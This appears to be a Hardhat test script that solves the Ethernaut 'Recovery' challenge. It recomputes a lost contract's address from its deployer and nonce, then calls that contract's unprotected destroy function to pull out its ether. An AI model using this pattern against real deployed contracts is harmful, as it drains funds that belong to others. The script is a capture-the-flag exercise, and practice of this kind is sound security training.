import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Recovery`);
  const challengeAddress = await createChallenge(
    `0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048`, ethers.utils.parseEther('0.001'));
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const recomputedContractAddress = ethers.utils.getContractAddress({
    from: challenge.address,
    nonce: BigNumber.from(`1`),
  });
  console.log(`recomputedContractAddress`, recomputedContractAddress)

  const attackerFactory = await ethers.getContractFactory(`SimpleToken`);
  attacker = await attackerFactory.attach(recomputedContractAddress);
  tx = await attacker.destroy(await eoa.getAddress());
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
